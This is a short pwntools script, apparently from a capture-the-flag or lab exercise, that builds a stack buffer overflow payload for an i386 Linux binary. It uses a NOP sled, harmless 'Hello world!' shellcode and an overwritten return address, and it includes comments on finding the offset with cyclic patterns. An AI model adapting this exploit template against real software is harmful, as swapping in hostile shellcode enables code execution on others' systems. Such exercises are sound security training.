from pwn import *
context.arch='i386'
context.os='linux'

'''
comandi per trovare offset
python3 -c 'import sys; sys.stdout.buffer.write(b"2\n" + b"A"*1022)' > payload_test
cyclic 600 >> payload_test
cyclic -l fjaa
535
'''

s_code = shellcraft.i386.linux.echo("Hello world!") + shellcraft.i386.linux.exit()
s_code_asm = asm(s_code)

ret_addr = 0xffffcd20 - 535
addr = p32(ret_addr, endian ='little')

nop = asm('nop', arch = 'i386')

payload = b"2\n" + b"A"*1022

payload += nop*(535 - len(s_code_asm) - 64) + s_code_asm + nop*64 + addr

with open("./payload_challenge_extra2", "wb") as f: 
	f.write(payload)
